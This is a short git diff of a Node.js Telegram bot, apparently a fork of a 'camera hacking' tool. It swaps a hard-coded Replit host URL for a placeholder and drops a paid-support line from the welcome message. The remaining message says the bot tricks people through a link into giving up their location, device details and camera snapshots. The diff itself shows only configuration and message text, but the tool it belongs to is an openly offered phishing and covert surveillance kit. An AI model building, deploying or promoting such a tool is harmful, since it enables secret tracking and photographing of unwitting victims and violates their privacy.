@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://TechieCamHackBot.techie24876.repl.co";
+var hostURL="Paste Your URL Here";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -71,7 +71,7 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Camera Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You Want To Create Your Bot Like This Then Watch Tutorial From Here @TechieGamer\n\nIf You Want I Make Your Bot Working For Lifetime Then DM Me @TechieGamerBot But It Cost 50 Rs.\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Camera Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You Want To Create Your Bot Like This Then Watch Tutorial From Here @TechieGamer\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
